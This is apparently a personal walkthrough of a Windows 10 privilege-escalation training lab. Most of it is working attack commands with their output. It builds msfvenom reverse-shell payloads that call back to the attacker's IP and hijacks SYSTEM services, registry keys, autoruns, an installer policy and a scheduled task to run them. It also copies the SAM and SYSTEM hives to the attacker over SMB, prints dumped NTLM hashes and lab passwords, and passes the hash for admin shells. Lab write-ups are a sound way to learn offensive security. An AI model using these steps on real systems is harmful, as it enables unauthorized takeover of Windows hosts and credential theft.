# Windows10privesc 

> VOiD | Thursday 20 January 2022 01:43:04 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.45.148



## Accessing VM 

```bash
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.45.148
```

## Generating reverse shell executable
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.253.221 LPORT=4444 -f exe -o reverse.exe
to create a smb server
sudo smbserver.py kali .   

copy \\10.8.253.221\kali\reverse.exe C:\PrivEsc\reverse.exe
```

## Service Exploits - Insecure Service Permissions
```bash


Use accesschk.exe to check the "user" accounts permissions on the "daclsvc" service:

C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc

RW daclsvc
SERVICE_QUERY_STATUS
SERVICE_QUERY_CONFIG
SERVICE_CHANGE_CONFIG
SERVICE_INTERROGATE
SERVICE_ENUMERATE_DEPENDENTS
SERVICE_START
SERVICE_STOP
READ_CONTROL-


Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).

Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):

sc qc daclsvc
sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem



Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:

sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

net start daclsvc

```

## Service Exploit - Unquoted Service Path
```bash
C:\PrivEsc>sc qc unquotedsvc
sc qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem


C:\PrivEsc>accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators

Copy the reverse.exe executable you created to this directory and rename it Common.exe:

copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

net start unquotedsvc


```

## Service Exploits - Weak Registry Permissions
```bash
Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

sc qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
HKLM\System\CurrentControlSet\Services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
	KEY_ALL_ACCESS
  RW BUILTIN\Administrators
	KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
	KEY_ALL_ACCESS

Overwrite the ImagePath registry key to point to the reverse.exe executable you created:

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

```

## Service Exploits - Insecure Service Executables
```bash
Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

sc qc filepermsvc

Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:

C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

Copy the reverse.exe executable you created and replace the filepermservice.exe with it:

copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

net start filepermsvc
```

## Registry - Autoruns
```bash

query the registry for AutoRun executables:

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"

C:\PrivEsc>\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
	FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
	FILE_ALL_ACCESS
  RW BUILTIN\Administrators
	FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
	FILE_ALL_ACCESS
  RW BUILTIN\Users
	FILE_ALL_ACCESS

copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y

Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!

rdesktop 10.10.45.148

```

## Registry - AlwaysInstallElevated
```bash
Query the registry for AlwaysInstallElevated keys:

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.253.221 LPORT=53 -f msi -o reverse.msi

Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).

Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:

copy \\10.8.253.221\kali\reverse.msi C:\PrivEsc\reverse.msi


msiexec /quiet /qn /i C:\PrivEsc\reverse.msi

```

## Passwords - Registry
```

(For some reason sometimes the password does not get stored in the registry. If this is the case, use the following as the answer: password123)

The registry can be searched for keys and values that contain the word "password":

reg query HKLM /f password /t REG_SZ /s

If you want to save some time, query this specific key to find admin AutoLogon credentials:

reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):

winexe -U 'admin%password' //10.10.45.148 cmd.exe
```

## Passwords - Saved Creds
```
List any saved credentials:

cmdkey /list
Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic 
    User: 02nfpgrklkitqatu
    Local machine persistence
    
    Target: Domain:interactive=WIN-QBA94KB3IOF\admin
    Type: Domain Password
    User: WIN-QBA94KB3IOF\admin

    

Note that credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.

Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:

runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

## Passwords - Security Account Manager (SAM)
```bash
The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.

Transfer the SAM and SYSTEM files to your Kali VM:

copy C:\Windows\Repair\SAM \\10.8.253.221\kali\
copy C:\Windows\Repair\SYSTEM \\10.8.253.221\kali\

On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:

git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
```

```bash
python3 /opt/tools/creddump7/pwdump.py SYSTEM SAM                          130 ⨯
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
```

## Passwords - Passing the Hash
```bash
Why crack a password hash when you can authenticate using the hash?

Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:

pth-winexe -U 'admin%hash' //10.10.45.148 cmd.exe
password123
```

##  Scheduled Tasks
```bash
View the contents of the C:\DevTools\CleanUp.ps1 script:

type C:\DevTools\CleanUp.ps1

The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:

C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1

Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1 which runs the reverse.exe executable you created:

echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1

Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.

```

## Startup Apps
```bash
Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:

C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:

cscript C:\PrivEsc\CreateShortcut.vbs

Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:

rdesktop -u admin 10.10.45.148

A shell running as admin should connect back to your listener.

```

